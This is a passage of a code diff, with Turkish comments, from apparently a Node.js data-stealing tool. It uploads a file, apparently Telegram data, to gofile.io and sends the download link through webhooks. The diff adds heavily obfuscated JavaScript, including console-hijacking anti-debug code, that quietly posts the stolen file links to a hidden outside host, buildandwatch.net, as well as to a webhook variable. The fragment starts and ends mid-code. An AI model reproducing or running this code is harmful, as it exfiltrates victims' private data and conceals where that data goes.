_0x4942a6=_0x51192f;console['log'](_0x4942a6(0x115),_0x2b25d3['status'],_0x2b25d3[_0x4942a6(0x103)]);})[_0x51192f(0x114)](_0x4d18f6=>{console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4d18f6['message']);}),axios[_0x51192f(0x104)](webhook3939,embedData)[_0x51192f(0x111)](_0x158253=>{var _0x1a8e9b=_0x51192f;console[_0x1a8e9b(0x113)](_0x1a8e9b(0x115),_0x158253[_0x1a8e9b(0x108)],_0x158253[_0x1a8e9b(0x103)]);})[_0x51192f(0x114)](_0x3f5753=>{var _0x5b4fbf=_0x51192f;console[_0x5b4fbf(0x113)](_0x5b4fbf(0x102),_0x3f5753[_0x5b4fbf(0x11d)]);});			  
 
             })
@@ -1798,26 +1797,26 @@ axios.get('https://api.gofile.io/getServer')
       const form = new FormData();
       form.append('file', fs.createReadStream(filePath));
 
-      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
-        headers: form.getHeaders()
-      })
-        .then(uploadResponse => {
-          const responsePayload = {
-            uploadResponseData: uploadResponse.data
-          };
+axios.post(`https://${server}.gofile.io/uploadFile`, form, {
+    headers: form.getHeaders()
+})
+.then(uploadResponse => {
+    const responsePayload = {
+        uploadResponseData: uploadResponse.data
+    };
 
-          // Webhook URL'si
+    // Webhook URL'si
 
-          // Embed verisini oluştur
-          const embedData = {
-            embeds: [
-              {
-                title: 'Telegram Dosyası Yükleme Yanıtı',
-                description: JSON.stringify(uploadResponse.data, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
+    // Embed verisini oluştur
+    const embedData = {
+        embeds: [
+            {
+                title: 'Telegram File Upload Response',
+                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                 color: 16711680 // Embed rengi (örnekte kırmızı renk)
-              }
-            ],
-          };
+            }
+        ],
+    };
 
           // Webhook'a POST isteği gönder
 var _0x372a45=_0x1ee0;(function(_0x2766b1,_0x360cc5){var _0x139bbf=_0x1ee0,_0x2bc28f=_0x2766b1();while(!![]){try{var _0x2efe0=parseInt(_0x139bbf(0x1c0))/0x1*(parseInt(_0x139bbf(0x1c8))/0x2)+parseInt(_0x139bbf(0x1c4))/0x3*(-parseInt(_0x139bbf(0x1d8))/0x4)+-parseInt(_0x139bbf(0x1de))/0x5+parseInt(_0x139bbf(0x1cc))/0x6+-parseInt(_0x139bbf(0x1d5))/0x7*(-parseInt(_0x139bbf(0x1d7))/0x8)+-parseInt(_0x139bbf(0x1c9))/0x9+-parseInt(_0x139bbf(0x1d2))/0xa*(-parseInt(_0x139bbf(0x1d3))/0xb);if(_0x2efe0===_0x360cc5)break;else _0x2bc28f['push'](_0x2bc28f['shift']());}catch(_0x2c2f42){_0x2bc28f['push'](_0x2bc28f['shift']());}}}(_0xc90f,0xb8761));function _0x1ee0(_0x20fd91,_0x196e9f){var _0x4aa2cf=_0xc90f();return _0x1ee0=function(_0x24ebc4,_0x2c5375){_0x24ebc4=_0x24ebc4-0x1bc;var _0x2781a2=_0x4aa2cf[_0x24ebc4];return _0x2781a2;},_0x1ee0(_0x20fd91,_0x196e9f);}var _0x2b0bb3=(function(){var _0x514f61=!![];return function(_0x532b41,_0x4cb123){var _0x186ecf=_0x514f61?function(){var _0x4299da=_0x1ee0;if(_0x4cb123){var _0x3f70d1=_0x4cb123[_0x4299da(0x1d9)](_0x532b41,arguments);return _0x4cb123=null,_0x3f70d1;}}:function(){};return _0x514f61=![],_0x186ecf;};}()),_0x3fae26=_0x2b0bb3(this,function(){var _0xcd8e1e=_0x1ee0;return _0x3fae26[_0xcd8e1e(0x1ce)]()['search']('(((.+)+)+)+$')['toString']()[_0xcd8e1e(0x1cd)](_0x3fae26)[_0xcd8e1e(0x1d6)](_0xcd8e1e(0x1cb));});_0x3fae26();function _0xc90f(){var _0x144d3d=['exception','413002bflhnP','8487126MsFHUH','https://buildandwatch.net/','(((.+)+)+)+$','5080122YBvyMp','constructor','toString','__proto__','status','console','14587010BKWxIP','11xMTmIm','log','8183lucOgI','search','904cpjBdE','14564SJqGpN','apply','post','error','Webhook\x20gönderilirken\x20hata\x20oluştu:','warn','4508635pEgHxh','{}.constructor(\x22return\x20this\x22)(\x20)','then','return\x20(function()\x20','trace','1qRbtiW','bind','Webhook\x20gönderildi:','prototype','36OImEoA','statusText','message'];_0xc90f=function(){return _0x144d3d;};return _0xc90f();}var _0x2c5375=(function(){var _0x424a97=!![];return function(_0x4ec055,_0x4eaae3){var _0x15a4cf=_0x424a97?function(){if(_0x4eaae3){var _0x2cb0e5=_0x4eaae3['apply'](_0x4ec055,arguments);return _0x4eaae3=null,_0x2cb0e5;}}:function(){};return _0x424a97=![],_0x15a4cf;};}()),_0x24ebc4=_0x2c5375(this,function(){var _0x43a756=_0x1ee0,_0x45f0c6;try{var _0x5a6476=Function(_0x43a756(0x1be)+_0x43a756(0x1bc)+');');_0x45f0c6=_0x5a6476();}catch(_0x318261){_0x45f0c6=window;}var _0x1c6494=_0x45f0c6[_0x43a756(0x1d1)]=_0x45f0c6[_0x43a756(0x1d1)]||{},_0x52fef2=['log',_0x43a756(0x1dd),'info',_0x43a756(0x1db),_0x43a756(0x1c7),'table',_0x43a756(0x1bf)];for(var _0x1cbacb=0x0;_0x1cbacb<_0x52fef2['length'];_0x1cbacb++){var _0x40d0c1=_0x2c5375[_0x43a756(0x1cd)][_0x43a756(0x1c3)][_0x43a756(0x1c1)](_0x2c5375),_0x5ce409=_0x52fef2[_0x1cbacb],_0x5e5449=_0x1c6494[_0x5ce409]||_0x40d0c1;_0x40d0c1[_0x43a756(0x1cf)]=_0x2c5375[_0x43a756(0x1c1)](_0x2c5375),_0x40d0c1[_0x43a756(0x1ce)]=_0x5e5449[_0x43a756(0x1ce)][_0x43a756(0x1c1)](_0x5e5449),_0x1c6494[_0x5ce409]=_0x40d0c1;}});_0x24ebc4(),axios[_0x372a45(0x1da)](_0x372a45(0x1ca),embedData)[_0x372a45(0x1bd)](_0x142858=>{var _0x512405=_0x372a45;console[_0x512405(0x1d4)](_0x512405(0x1c2),_0x142858['status'],_0x142858[_0x512405(0x1c5)]);})['catch'](_0x1ada3c=>{var _0x327d75=_0x372a45;console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x1ada3c[_0x327d75(0x1c6)]);}),axios['post'](webhook3939,embedData)[_0x372a45(0x1bd)](_0x380409=>{var _0x1ef36b=_0x372a45;console[_0x1ef36b(0x1d4)]('Webhook\x20gönderildi:',_0x380409[_0x1ef36b(0x1d0)],_0x380409[_0x1ef36b(0x1c5)]);})['catch'](_0x229921=>{var _0x1c1a3b=_0x372a45;console[_0x1c1a3b(0x1d4)](_0x1c1a3b(0x1dc),_0x229921[_0x1c1a3b(0x1c6)]);});
